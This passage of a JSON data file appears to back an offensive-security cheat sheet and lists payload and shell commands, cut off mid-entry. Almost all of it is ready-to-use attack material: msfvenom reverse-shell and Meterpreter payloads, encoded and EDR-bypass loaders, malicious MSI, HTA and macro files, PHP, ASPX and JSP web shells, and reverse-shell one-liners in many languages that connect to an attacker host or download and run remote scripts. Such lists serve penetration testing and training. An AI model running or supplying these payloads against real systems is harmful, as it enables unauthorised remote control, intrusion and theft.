          }
        ]
      }
    ]
  },
  {
    "id": "payload-craft",
    "name": "Payload Engineering & Delivery",
    "icon": "🖥️",
    "description": "Generate reverse shells, bind shells, web shells, and custom payloads for various platforms using msfvenom and other payload generation tools.",
    "subcategories": [
      {
        "name": "Reverse Shell Payloads (msfvenom)",
        "commands": [
          {
            "title": "Windows Reverse Shell EXE",
            "desc": "Generate Windows reverse shell executable",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Windows Meterpreter EXE",
            "desc": "Generate Windows Meterpreter executable",
            "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter.exe",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Windows Reverse Shell DLL",
            "desc": "Generate Windows reverse shell DLL",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Linux Reverse Shell ELF",
            "desc": "Generate Linux reverse shell binary",
            "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Linux Meterpreter ELF",
            "desc": "Generate Linux Meterpreter binary",
            "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o meterpreter.elf",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "PHP Reverse Shell",
            "desc": "Generate PHP reverse shell script",
            "cmd": "msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "JSP Reverse Shell",
            "desc": "Generate JSP reverse shell",
            "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "WAR Reverse Shell",
            "desc": "Generate WAR file reverse shell for Tomcat",
            "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "ASP Reverse Shell",
            "desc": "Generate classic ASP reverse shell",
            "cmd": "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o shell.asp",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "ASPX Reverse Shell",
            "desc": "Generate ASPX reverse shell",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Python Reverse Shell",
            "desc": "Generate Python reverse shell payload",
            "cmd": "msfvenom -p cmd/unix/reverse_python LHOST=<LHOST> LPORT=<LPORT> -f raw",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Bash Reverse Shell",
            "desc": "Generate Bash reverse shell payload",
            "cmd": "msfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "PowerShell Reverse Shell",
            "desc": "Generate PowerShell reverse shell payload",
            "cmd": "msfvenom -p cmd/windows/reverse_powershell LHOST=<LHOST> LPORT=<LPORT> -f raw",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "msfvenom Windows HTTPS",
            "desc": "Encrypted HTTPS meterpreter",
            "cmd": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f exe -o shell_https.exe",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "msfvenom Bind TCP",
            "desc": "Windows bind shell",
            "cmd": "msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=<TARGET_IP> LPORT=<PORT> -f exe -o bind.exe",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "msfvenom Bash Shell",
            "desc": "Unix bash reverse",
            "cmd": "msfvenom -p cmd/unix/reverse_bash LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "msfvenom Python Shell",
            "desc": "Unix python reverse",
            "cmd": "msfvenom -p cmd/unix/reverse_python LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "msfvenom WAR",
            "desc": "WAR for Tomcat",
            "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war -o shell.war",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Staged vs Stageless",
        "commands": [
          {
            "title": "Staged Payload (Windows)",
            "desc": "Generate staged payload — smaller, needs handler",
            "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o staged.exe",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Staged: / in payload name (reverse_tcp). Downloads second stage from handler."
          },
          {
            "title": "Stageless Payload (Windows)",
            "desc": "Generate stageless payload — self-contained",
            "cmd": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o stageless.exe",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Stageless: _ in payload name (reverse_tcp). Contains full payload — larger but more reliable."
          },
          {
            "title": "Staged Payload (Linux)",
            "desc": "Generate staged Linux payload",
            "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o staged.elf",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Stageless Payload (Linux)",
            "desc": "Generate stageless Linux payload",
            "cmd": "msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o stageless.elf",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "List Available Payloads",
            "desc": "Show all available msfvenom payloads",
            "cmd": "msfvenom --list payloads",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "List Available Encoders",
            "desc": "Show all available payload encoders",
            "cmd": "msfvenom --list encoders",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "List Available Formats",
            "desc": "Show all available output formats",
            "cmd": "msfvenom --list formats",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "List Payloads",
            "desc": "Show all payloads",
            "cmd": "msfvenom --list payloads | grep <KEYWORD>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "List Encoders",
            "desc": "Show encoders",
            "cmd": "msfvenom --list encoders",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "List Formats",
            "desc": "Show output formats",
            "cmd": "msfvenom --list formats",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Web Shells",
        "commands": [
          {
            "title": "PHP One-Liner Shell",
            "desc": "Minimal PHP web shell",
            "cmd": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PHP Passthru Shell",
            "desc": "PHP shell using passthru()",
            "cmd": "echo '<?php passthru($_GET[\"cmd\"]); ?>' > shell.php",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PHP Shell_Exec Shell",
            "desc": "PHP shell using shell_exec()",
            "cmd": "echo '<?php echo shell_exec($_GET[\"cmd\"]); ?>' > shell.php",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PHP Proc_Open Shell",
            "desc": "PHP shell using proc_open()",
            "cmd": "echo '<?php $p=proc_open($_GET[\"cmd\"],[1=>[\"pipe\",\"w\"]],$$ps);echo stream_get_contents($$ps[1]); ?>' > shell.php",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "ASPX Web Shell",
            "desc": "Minimal ASPX web shell",
            "cmd": "echo '<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo{FileName=\"cmd.exe\",Arguments=\"/c \"+Request[\"cmd\"],UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd(); %>' > shell.aspx",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "JSP Web Shell",
            "desc": "Minimal JSP web shell",
            "cmd": "echo '<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>' > shell.jsp",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Office & Macro Payloads",
        "commands": [
          {
            "title": "VBA Macro Payload",
            "desc": "Generate VBA macro for Office documents",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f vba -o macro.vba",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "HTA PowerShell Payload",
            "desc": "Generate HTA file with PowerShell payload",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f hta-psh -o shell.hta",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "MSI Installer Payload",
            "desc": "Generate malicious MSI installer",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Custom Shellcode",
        "commands": [
          {
            "title": "Raw Shellcode (Python)",
            "desc": "Generate shellcode in Python format",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f python -o shellcode.py",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Raw Shellcode (C)",
            "desc": "Generate shellcode in C format",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -o shellcode.c",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Raw Shellcode (C#)",
            "desc": "Generate shellcode in C# format",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f csharp -o shellcode.cs",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Raw Shellcode (Hex)",
            "desc": "Generate shellcode as hex string",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f hex",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Raw Shellcode (Raw)",
            "desc": "Generate raw binary shellcode",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shellcode.bin",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Encoded Payload (Shikata)",
            "desc": "Encode payload with shikata_ga_nai encoder",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x64/xor_dynamic -i 5 -f exe -o encoded.exe",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Payload with Bad Chars Excluded",
            "desc": "Generate payload avoiding null bytes and bad characters",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b '\\x00\\x0a\\x0d' -f exe -o clean.exe",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "x86 Encoded Payload",
            "desc": "Encode x86 payload with shikata_ga_nai",
            "cmd": "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 10 -f exe -o encoded32.exe",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Donut PE to Shellcode",
            "desc": "Convert PE to shellcode",
            "cmd": "donut -i payload.exe -o loader.bin",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "ScareCrow Loader",
            "desc": "EDR bypass loader",
            "cmd": "ScareCrow -I shellcode.bin -domain <DOMAIN> -Loader binary",
            "tags": [
              "advanced"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "initial-foothold",
    "name": "Shells, Listeners & Stabilization",
    "icon": "🐚",
    "description": "Establish reverse shells, bind shells, and web shells across platforms, then upgrade to fully interactive TTYs for stable exploitation.",
    "subcategories": [
      {
        "name": "Listener Setup",
        "commands": [
          {
            "title": "Netcat Listener",
            "desc": "Start a basic netcat listener",
            "cmd": "nc -lvnp <LPORT>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Rlwrap Netcat Listener",
            "desc": "Netcat listener with readline (arrow keys)",
            "cmd": "rlwrap nc -lvnp <LPORT>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Socat Listener",
            "desc": "Start a socat listener",
            "cmd": "socat TCP-LISTEN:<LPORT>,reuseaddr,fork -",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Socat Encrypted Listener",
            "desc": "Socat listener with SSL encryption",
            "cmds": [
              "openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt",
              "cat shell.key shell.crt > shell.pem",
              "socat OPENSSL-LISTEN:<LPORT>,cert=shell.pem,verify=0,reuseaddr,fork -"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Metasploit Multi/Handler",
            "desc": "Start MSF multi/handler for staged payloads",
            "cmds": [
              "msfconsole -q",
              "use exploit/multi/handler",
              "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
              "set LHOST <LHOST>",
              "set LPORT <LPORT>",
              "run"
            ],
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Metasploit Handler (One-Liner)",
            "desc": "Quick MSF handler start from command line",
            "cmd": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run'",
            "tags": [
              "essential",
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Linux Reverse Shells",
        "commands": [
          {
            "title": "Bash Reverse Shell",
            "desc": "Bash TCP reverse shell",
            "cmd": "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Bash Reverse Shell (Alt)",
            "desc": "Alternative bash reverse shell using file descriptors",
            "cmd": "bash -c 'exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do $line 2>&5 >&5; done'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Bash Reverse Shell (exec)",
            "desc": "Bash reverse shell with exec redirection",
            "cmd": "0<&196;exec 196<>/dev/tcp/<LHOST>/<LPORT>; sh <&196 >&196 2>&196",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Python3 Reverse Shell",
            "desc": "Python3 one-liner reverse shell",
            "cmd": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Python2 Reverse Shell",
            "desc": "Python2 one-liner reverse shell",
            "cmd": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PHP Reverse Shell",
            "desc": "PHP one-liner reverse shell",
            "cmd": "php -r '$sock=fsockopen(\"<LHOST>\",<LPORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Perl Reverse Shell",
            "desc": "Perl one-liner reverse shell",
            "cmd": "perl -e 'use Socket;$i=\"<LHOST>\";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Ruby Reverse Shell",
            "desc": "Ruby one-liner reverse shell",
            "cmd": "ruby -rsocket -e'f=TCPSocket.open(\"<LHOST>\",<LPORT>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Netcat Reverse Shell (-e)",
            "desc": "Netcat reverse shell with -e option",
            "cmd": "nc -e /bin/sh <LHOST> <LPORT>",
            "tags": [
              "essential"
            ],
            "note": "Only on netcat versions with -e flag (traditional)"
          },
          {
            "title": "Netcat Reverse Shell (mkfifo)",
            "desc": "Netcat reverse shell without -e flag",
            "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Socat Reverse Shell",
            "desc": "Socat reverse shell",
            "cmd": "socat TCP:<LHOST>:<LPORT> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Socat Encrypted Reverse Shell",
            "desc": "Socat reverse shell over encrypted channel",
            "cmd": "socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Lua Reverse Shell",
            "desc": "Lua one-liner reverse shell",
            "cmd": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('<LHOST>','<LPORT>');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Awk Reverse Shell",
            "desc": "AWK reverse shell one-liner",
            "cmd": "awk 'BEGIN {s = \"/inet/tcp/0/<LHOST>/<LPORT>\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Groovy Reverse Shell",
            "desc": "Groovy reverse shell for Jenkins Script Console",
            "cmd": "String host='<LHOST>';int port=<LPORT>;String cmd='/bin/bash';Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break}catch(Exception e){}};p.destroy();s.close()",
            "tags": [
              "advanced"
            ],
            "note": "Use in Jenkins Groovy Script Console"
          },
          {
            "title": "Node.js Reverse Shell",
            "desc": "Node.js one-liner reverse shell",
            "cmd": "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/bash\",[]);var client=new net.Socket();client.connect(<LPORT>,\"<LHOST>\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});})()'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Golang Reverse Shell",
            "desc": "Go language reverse shell (compile on attacker)",
            "cmd": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"<LHOST>:<LPORT>\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go build -o /tmp/rs /tmp/rs.go && /tmp/rs",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Telnet Reverse Shell",
            "desc": "Reverse shell using telnet",
            "cmd": "TF=$(mktemp -u);mkfifo $TF && telnet <LHOST> <LPORT> 0<$TF | /bin/sh 1>$TF",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "OpenSSL Reverse Shell",
            "desc": "Encrypted reverse shell via OpenSSL",
            "cmds": [
              "# On attacker: openssl s_server -quiet -key key.pem -cert cert.pem -port <LPORT>",
              "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <LHOST>:<LPORT> > /tmp/s; rm /tmp/s"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Busybox NC Shell",
            "desc": "Busybox netcat shell",
            "cmd": "busybox nc <ATTACKER_IP> <PORT> -e /bin/sh",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Groovy Shell (Jenkins)",
            "desc": "Shell for Jenkins console",
            "cmd": "String h=\"<ATTACKER_IP>\";int p=<PORT>;String c=\"/bin/bash\";Process pr=new ProcessBuilder(c).redirectErrorStream(true).start();Socket s=new Socket(h,p);InputStream pi=pr.getInputStream(),pe=pr.getErrorStream(),si=s.getInputStream();OutputStream po=pr.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);}",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Windows Reverse Shells",
        "commands": [
          {
            "title": "PowerShell Reverse Shell (One-Liner)",
            "desc": "PowerShell TCP reverse shell one-liner",
            "cmd": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PowerShell Base64 Reverse Shell",
            "desc": "Base64-encoded PowerShell reverse shell",
            "cmds": [
              "echo -n '$client = New-Object System.Net.Sockets.TCPClient(\"<LHOST>\",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w 0",
              "powershell -nop -enc <BASE64_OUTPUT>"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PowerShell Download & Execute",
            "desc": "Download and execute reverse shell script",
            "cmd": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nishang Invoke-PowerShellTcp",
            "desc": "Nishang reverse shell module",
            "cmd": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>\"",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "ConPtyShell (Full Interactive)",
            "desc": "Fully interactive Windows reverse shell",
            "cmds": [
              "# On attacker:",
              "stty raw -echo; (stty size; cat) | nc -lvnp <LPORT>",
              "# On target (PowerShell):",
              "IEX(IWR http://<LHOST>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <LHOST> <LPORT>"
            ],
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Windows Netcat Reverse Shell",
            "desc": "Netcat reverse shell on Windows",
            "cmd": "nc.exe -e cmd.exe <LHOST> <LPORT>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PowerShell Reverse Shell (Compact)",
            "desc": "Shorter PowerShell reverse shell one-liner",
            "cmd": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PowerShell RunspacePool Shell",
            "desc": "Reverse shell using RunspacePool for stealth",
            "cmd": "powershell -nop -c \"$r=[RunspaceFactory]::CreateRunspace();$r.Open();$p=[PowerShell]::Create();$p.Runspace=$r;$p.AddScript({$c=New-Object Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}});$p.Invoke()\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "PowerCat Reverse Shell",
            "desc": "PowerShell netcat reverse shell module",
            "cmd": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e cmd.exe\"",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "mshta Shell",
            "desc": "Shell via mshta LOLBin",
            "cmd": "mshta http://<ATTACKER_IP>/shell.hta",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "regsvr32 Shell",
            "desc": "Shell via regsvr32 AppLocker bypass",
            "cmd": "regsvr32 /s /n /u /i:http://<ATTACKER_IP>/shell.sct scrobj.dll",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "PowerCat Shell",
            "desc": "PowerShell netcat alternative",
            "cmds": [
              "IEX(New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>/powercat.ps1')",
              "powercat -c <ATTACKER_IP> -p <PORT> -e cmd.exe"
            ],
            "tags": [
              "tool"
            ]
          },
          {
            "title": "ConPtyShell",
            "desc": "Fully interactive Windows shell",
            "cmds": [
              "# Attacker: stty raw -echo; (stty size; cat) | nc -lvnp <PORT>",
              "# Target: IEX(IWR http://<ATTACKER_IP>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp <ATTACKER_IP> -RemotePort <PORT>"
            ],
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "Bind Shells",
        "commands": [
          {
            "title": "Netcat Bind Shell (Linux)",
            "desc": "Start a bind shell listener on target",
            "cmd": "nc -lvnp <PORT> -e /bin/bash",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Netcat Bind Shell (mkfifo)",
            "desc": "Bind shell without -e flag",
            "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp <PORT> >/tmp/f",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Socat Bind Shell",
            "desc": "Socat bind shell with TTY",
            "cmd": "socat TCP-LISTEN:<PORT>,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Python Bind Shell",
            "desc": "Python bind shell",
            "cmd": "python3 -c 'import socket,os,subprocess;s=socket.socket();s.bind((\"0.0.0.0\",<PORT>));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Connect to Bind Shell",
            "desc": "Connect to an established bind shell",
            "cmd": "nc -nv <TARGET_IP> <PORT>",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Web Shells",
        "commands": [
          {
            "title": "PHP System Shell",
            "desc": "PHP web shell using system()",
            "cmd": "<?php system($_GET['cmd']); ?>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PHP Passthru Shell",
            "desc": "PHP web shell using passthru()",
            "cmd": "<?php passthru($_REQUEST['cmd']); ?>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PHP Shell_Exec Shell",
            "desc": "PHP web shell using shell_exec()",
            "cmd": "<?php echo shell_exec($_GET['cmd']); ?>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PHP Exec Shell",
            "desc": "PHP web shell using exec()",
            "cmd": "<?php echo exec($_GET['cmd']); ?>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PHP Proc_Open Shell",
            "desc": "PHP web shell using proc_open()",
            "cmd": "<?php $d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=proc_open($_GET['cmd'],$d,$pipes);echo stream_get_contents($pipes[1]);?>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Kali PHP Reverse Shell",
            "desc": "Use the full-featured Kali PHP reverse shell",
            "cmd": "cp /usr/share/webshells/php/php-reverse-shell.php shell.php && sed -i 's/127.0.0.1/<LHOST>/;s/1234/<LPORT>/' shell.php",
            "tags": [
              "essential"
            ],
            "note": "Edit $ip and $port in the file before uploading"
          },
          {
            "title": "Access Web Shell",
            "desc": "Execute commands via uploaded web shell",
            "cmd": "curl 'http://<TARGET_IP>/uploads/shell.php?cmd=id'",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Interactive Shell Upgrade",
        "commands": [
          {
            "title": "Python PTY Spawn",
            "desc": "Spawn a PTY shell with Python",
